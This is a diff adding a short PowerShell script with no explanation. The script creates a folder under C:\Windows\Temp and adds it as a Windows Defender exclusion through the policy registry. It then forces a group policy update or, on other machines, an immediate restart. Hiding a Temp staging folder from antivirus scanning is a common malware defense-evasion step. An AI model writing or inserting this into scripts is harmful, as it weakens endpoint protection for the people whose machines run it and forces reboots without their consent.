@@ -1,0 +1,14 @@
+$Path = "C:\Windows\Temp\Cache"
+New-Item -Type Directory -Path $Path
+
+Get-MpPreference | Select -ExpandProperty ExclusionPath
+if ( ( Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" )-eq $false ) {
+    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\" -Name 'Paths' -Force
+}
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" -Name $Path -Value 0 -PropertyType String -Force
+Get-MpPreference | Select -ExpandProperty ExclusionPath
+if ( (Test-Path "C:\Windows\System32\GroupPolicy\Machine\Registry.pol") -or (Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain ) {
+    gpupdate /force
+} else {
+    Restart-Computer -Force
+}
